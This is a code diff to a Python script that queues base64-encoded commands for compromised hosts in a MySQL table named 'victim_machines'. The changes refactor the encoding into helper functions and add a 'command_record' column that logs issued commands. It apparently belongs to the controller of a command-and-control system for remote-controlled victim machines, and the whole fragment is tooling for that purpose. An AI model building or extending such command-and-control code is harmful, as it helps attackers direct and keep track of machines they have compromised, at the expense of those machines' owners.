@@ -8,6 +8,18 @@ import time
 import mysql.connector
 from mysql.connector import MySQLConnection, Error
 
+def decode ( input ):
+        output_bytes = input.encode('ascii')
+        decoded_output_bytes = base64.b64decode(output_bytes)
+        decoded_output = decoded_output_bytes.decode('ascii')
+        return decoded_output
+
+def encode ( input ):
+	updated_entry = input.encode('ascii')
+	updated_bytes = base64.b64encode(updated_entry)
+	encoded_updated = updated_bytes.decode('ascii')
+	return encoded_updated
+
 def editcommand( id, command ):
 
 	#base query to check whether or not the id requested appears in the database
@@ -29,10 +41,7 @@ def editcommand( id, command ):
 		if result:
 			print("id found in the database, modifying entry...")
 			#grab old command, decode it, add the new command in json, re-encode it
-			old_command = result[0][0]
-			old_command_bytes = old_command.encode('ascii')
-			decoded_old_bytes = base64.b64decode(old_command_bytes)
-			decoded_command = decoded_old_bytes.decode('ascii')
+			decoded_command = decode(result[0][0])
 
 			json_data = json.loads(decoded_command)
 			seconds_from_epoch = int(time.time())
@@ -41,16 +50,15 @@ def editcommand( id, command ):
 #			print(json.dumps(json_data))
 
 			json_string = str(json.dumps(json_data))
-			#re-encoding process
-			updated_entry = json_string.encode('ascii')
-			updated_bytes = base64.b64encode(updated_entry)
-			encoded_updated = updated_bytes.decode('ascii')
-#			print(encoded_updated)
+			encoded_updated = encode(json_string)
 
 			#update the database if the row already exists
 			update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
 			update_data = (encoded_updated, id)
+			command_record_query = """ UPDATE victim_machines SET command_record=%s WHERE victim_id=%s """
+
 			cursor.execute(update_query, update_data)
+			cursor.execute(command_record_query, update_data)
 
 		#catch the case in which the victim_id does not exist in the table and create a new entry
 		else:
@@ -58,11 +66,10 @@ def editcommand( id, command ):
 			print("creating new entry in database...")
 			empty_command_output = "{}"
 			formatted_command = "{\"1\": \"" + command + "\"}"
-			formatted_ascii = formatted_command.encode('ascii')
-			formatted_bytes = base64.b64encode(formatted_ascii)
-			formatted_encoded = formatted_bytes.decode('ascii')
-			create_query = """ INSERT INTO victim_machines (victim_id, command, command_output) VALUES (%s, %s, %s) """
-			create_data = (id, formatted_encoded,empty_command_output)
+			formatted_encoded = encode(formatted_command)
+
+			create_query = """ INSERT INTO victim_machines (victim_id, command, command_output, command_record) VALUES (%s, %s, %s, %s) """
+			create_data = (id, formatted_encoded,empty_command_output, formatted_encoded)
 
 			cursor.execute(create_query, create_data)
 
